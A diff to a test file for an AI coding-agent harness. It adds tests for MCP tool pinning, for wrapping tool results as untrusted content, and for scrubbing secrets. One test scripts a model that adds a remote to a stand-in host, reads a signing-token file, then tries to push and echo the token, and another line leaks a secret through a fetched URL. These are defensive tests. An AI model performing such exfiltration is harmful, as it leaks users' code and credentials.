@@ -3,6 +3,7 @@ import 'dart:convert';
 import 'dart:io';
 
 import 'package:every_ai/features/code/domain/agent_mode.dart';
+import 'package:every_ai/features/code/domain/mcp_tool_check.dart' show mcpToolDigest;
 import 'package:every_ai/features/code/domain/subagents.dart' show forkAnswerReason, taskTool;
 import 'package:every_ai/features/code/harness/events.dart';
 import 'package:every_ai/features/code/domain/permissions.dart';
@@ -401,6 +402,26 @@ void main() {
     expect(jsonEncode(gateway.requests.last['tools']), jsonEncode(gateway.requests.first['tools']));
   });
 
+  test('a fork\'s security alert reaches the app like any session\'s', () async {
+    gateway.reply(text: 'Parent done.');
+    final parent = await harness.start(spec('hi'));
+    await drive(parent);
+    gateway
+      ..reply(
+        calls: [
+          (securityAlertTool, {'severity': 'warning', 'what': 'x', 'action_taken': 'y', 'stop_run': false}),
+        ],
+      )
+      ..reply(text: 'Report.');
+    final child = await harness.fork(parent.id, spec('do a thing'));
+    // It waits for the app's answer (which notifies), instead of the fork refusal.
+    final events = await drive(child);
+    expect(events.whereType<ActionCall>().single.toolName, securityAlertTool);
+    final result = events.whereType<ToolResult>().single;
+    expect(result.outcome, isNot(ToolOutcome.error));
+    expect(result.text, isNot(contains('a fork cannot use')));
+  });
+
   test('past the threshold the history is compacted in place and the run carries on', () async {
     gateway
       ..reply(
@@ -596,7 +617,7 @@ void main() {
     ]);
     expect(calls, 1);
     expect(both.map((o) => o.text), everyElement(contains('developer.mozilla.org/a')));
-    expect(both.where((o) => o.text.contains('repeated="true"')), hasLength(1));
+    expect(both.where((o) => o.text.startsWith('(Same results as an earlier search.)')), hasLength(1));
     // Another session pays for its own.
     await runner('search-2').run('web_search', {'query': 'webgl game loop'});
     expect(calls, 2);
@@ -782,6 +803,155 @@ for line in sys.stdin:
     final last = second.last! as Map;
     expect(jsonEncode(last['content']), contains('data:image/png;base64,'));
     await session.close();
+  });
+
+  group('MCP tools are vetted', () {
+    final lookup = {
+      'name': 'lookup',
+      'description': 'Looks a word up',
+      'inputSchema': {
+        'type': 'object',
+        'properties': {
+          'word': {'type': 'string'},
+        },
+      },
+    };
+    final define = {...lookup, 'name': 'define', 'description': 'Defines a word'};
+    late File server;
+    setUp(() {
+      server = File('$work/dict_mcp.py')
+        ..writeAsStringSync('''
+import json, sys
+TOOLS = json.loads(${jsonEncode(jsonEncode([lookup, define]))})
+for line in sys.stdin:
+    m = json.loads(line)
+    if "id" not in m: continue
+    meth = m["method"]
+    if meth == "initialize": r = {"protocolVersion": "2025-06-18", "capabilities": {"tools": {}}}
+    elif meth == "tools/list": r = {"tools": TOOLS}
+    elif meth == "tools/call": r = {"content": [{"type": "text", "text": "meaning of " + m["params"]["arguments"].get("word", "")}]}
+    else: r = {}
+    print(json.dumps({"jsonrpc": "2.0", "id": m["id"], "result": r}), flush=True)
+''');
+    });
+    Map<String, Object?> dict({Map<String, String>? pinned}) => {
+      'dict': {
+        'command': 'python3',
+        'args': [server.path],
+        'pinned': ?pinned,
+      },
+    };
+    List<Object?> toolNames(Map<String, Object?> request) => [
+      for (final t in request['tools']! as List<Object?>) ((t! as Map)['function']! as Map)['name'],
+    ];
+
+    test('a changed tool is left out, the prompt says so, and results come back wrapped', () async {
+      gateway
+        ..reply(
+          calls: [
+            ('lookup', {'word': 'cat'}),
+          ],
+        )
+        ..reply(text: 'Done.');
+      final session = await harness.start(
+        SessionSpec(
+          workingDir: work,
+          model: 'anthropic/claude-sonnet-5.5',
+          mode: AgentMode.fullAuto,
+          llmBaseUrl: gateway.baseUrl,
+          llmApiKey: 'sk-test',
+          sessionTag: 'tag-1',
+          initialMessage: 'what is a cat',
+          mcpConfig: dict(pinned: {'lookup': mcpToolDigest(lookup), 'define': 'an older digest'}),
+        ),
+      );
+      final events = await drive(session);
+      final first = gateway.requests.first;
+      expect(toolNames(first), contains('lookup'));
+      expect(toolNames(first), isNot(contains('define')));
+      final system = ((first['messages']! as List<Object?>).first! as Map)['content'] as String;
+      expect(system, contains('These MCP tools were left out because they changed or look unsafe'));
+      expect(system, contains('dict/define'));
+      expect(
+        events.whereType<ToolResult>().single.text,
+        contains('<untrusted-content source="mcp:dict/lookup">\nmeaning of cat\n</untrusted-content>'),
+      );
+      final report = await (session as ReportsMcpTools).mcpReport;
+      expect([for (final p in report['dict']!.pending) p.name], ['define']);
+      expect(report['dict']!.pin, isEmpty);
+      await session.close();
+    });
+
+    test('a reopened session connects to the servers as they are now, not as saved', () async {
+      gateway.reply(text: 'Hi.');
+      final session = await harness.start(
+        SessionSpec(
+          workingDir: work,
+          model: 'anthropic/claude-sonnet-5.5',
+          mode: AgentMode.fullAuto,
+          llmBaseUrl: gateway.baseUrl,
+          llmApiKey: 'sk-test',
+          sessionTag: 'tag-1',
+          initialMessage: 'hello',
+          mcpConfig: dict(),
+        ),
+      );
+      await drive(session);
+      // First use: both tools are clean, so both are pinned.
+      final report = await (session as ReportsMcpTools).mcpReport;
+      expect(report['dict']!.pin.keys, unorderedEquals(['lookup', 'define']));
+      expect(toolNames(gateway.requests.last), containsAll(['lookup', 'define']));
+      await session.close();
+
+      // The user turned the server off since.
+      gateway.reply(text: 'Bye.');
+      final fresh = EveryAIHarness(dataDir: () async => '${tmp.path}/data', gatewayKey: () async => 'sk-test');
+      final reopened = await fresh.attachWithMcp(session.id, const {});
+      final said = reopened.events.firstWhere((e) => e is ChatMessage && !e.fromUser && e.text == 'Bye.');
+      await reopened.send('again');
+      await said.timeout(const Duration(seconds: 20));
+      expect(toolNames(gateway.requests.last), isNot(contains('lookup')));
+      final saved = File('${tmp.path}/data/everyai-sessions/${session.id}/spec.json').readAsStringSync();
+      expect(saved, isNot(contains('dict_mcp.py')));
+      await reopened.close();
+    });
+
+    test('a workflow agent reopened with a new host also takes the servers as they are now', () async {
+      gateway.reply(text: 'Reproduced.');
+      final session = await harness.start(
+        SessionSpec(
+          workingDir: work,
+          model: 'anthropic/claude-sonnet-5.5',
+          mode: AgentMode.fullAuto,
+          llmBaseUrl: gateway.baseUrl,
+          llmApiKey: 'sk-test',
+          sessionTag: 'tag-1',
+          initialMessage: 'fix the bug',
+          subagent: true,
+          mcpConfig: dict(),
+        ),
+      );
+      await drive(session);
+      expect(toolNames(gateway.requests.last), contains('lookup'));
+      await session.close();
+
+      // The user turned the server off since; the old host token died with the app.
+      gateway.reply(text: 'Verified.');
+      final fresh = EveryAIHarness(dataDir: () async => '${tmp.path}/data', gatewayKey: () async => 'sk-test');
+      final reopened = await fresh.attachBriefed(
+        session.id,
+        const DriverBriefing(mcpUrl: 'http://127.0.0.1:1/mcp', mcpToken: 'fresh'),
+        mcpConfig: const {},
+      );
+      final said = reopened.events.firstWhere((e) => e is ChatMessage && !e.fromUser && e.text == 'Verified.');
+      await reopened.send('Carry on');
+      await said.timeout(const Duration(seconds: 20));
+      expect(toolNames(gateway.requests.last), isNot(contains('lookup')));
+      final saved = File('${tmp.path}/data/everyai-sessions/${session.id}/spec.json').readAsStringSync();
+      expect(saved, isNot(contains('dict_mcp.py')));
+      expect(saved, isNot(contains('fresh')));
+      await reopened.close();
+    });
   });
 
   test("a briefed session reaches the app's host as everyai__ tools, in place of its own memory", () async {
@@ -972,6 +1142,70 @@ for line in sys.stdin:
     final leak = await runner.run('web_fetch', {'url': 'https://github.com/search?q=supersecretvalue123'});
     expect(leak.text, contains('secret'));
     await shell.killAll();
+  });
+
+  test('a remote the agent added stays unpushable after a model switch and after reopening', () async {
+    for (final args in [
+      ['init', '-q'],
+      ['remote', 'add', 'origin', 'https://github.com/me/repo.git'],
+    ]) {
+      expect((await Process.run('git', args, workingDirectory: work)).exitCode, 0);
+    }
+    File('$work/app.key').writeAsStringSync('SIGNING_TOKEN=Kx7remembered9value\n');
+    gateway
+      ..reply(
+        calls: [
+          ('bash', {'command': 'git remote add x https://example.invalid/r.git'}),
+          ('read', {'file_path': 'app.key'}),
+        ],
+      )
+      ..reply(text: 'Added.');
+    final session = await harness.start(spec('add a remote', mode: AgentMode.bypass));
+    await drive(session);
+    final state =
+        jsonDecode(File('${tmp.path}/data/everyai-sessions/${session.id}/state.json').readAsStringSync()) as Map;
+    expect(state['push_targets'], isNot(contains('x')));
+
+    /// Sends [text], answers with [calls] then [last], and returns the results of this turn.
+    Future<List<ToolResult>> turn(HarnessSession s, List<(String, Map<String, Object?>)> calls, String last) async {
+      gateway
+        ..reply(calls: calls)
+        ..reply(text: last);
+      final results = <ToolResult>[];
+      var live = false;
+      final said = Completer<void>();
+      final sub = s.events.listen((e) {
+        if (e is ConnectionChange) live = true;
+        if (live && e is ToolResult) results.add(e);
+        if (live && e is StateChange && e.executionStatus == ExecutionStatus.waitingForConfirmation) {
+          unawaited(s.respond(accept: true));
+        }
+        if (live && e is ChatMessage && !e.fromUser && e.text == last && !said.isCompleted) said.complete();
+      });
+      await s.send('go on');
+      await said.future.timeout(const Duration(seconds: 20));
+      await sub.cancel();
+      return results;
+    }
+
+    await session.switchLlm(spec('x', mode: AgentMode.bypass));
+    final afterSwitch = await turn(session, [
+      ('bash', {'command': 'git push x main'}),
+      ('bash', {'command': 'echo Kx7remembered9value'}),
+    ], 'Switched.');
+    expect(afterSwitch.first.text, contains("this repository's remotes"));
+    expect(afterSwitch.last.text, isNot(contains('Kx7remembered9value')));
+    await session.close();
+
+    final reopened = await EveryAIHarness(
+      dataDir: () async => '${tmp.path}/data',
+      gatewayKey: () async => 'sk-test',
+    ).attach(session.id);
+    final afterReopen = await turn(reopened, [
+      ('bash', {'command': 'git push x main'}),
+    ], 'Reopened.');
+    expect(afterReopen.single.text, contains("this repository's remotes"));
+    await reopened.close();
   });
 
   test('the scrubber catches key shapes and secret-named env values, and lets ordinary URLs through', () {
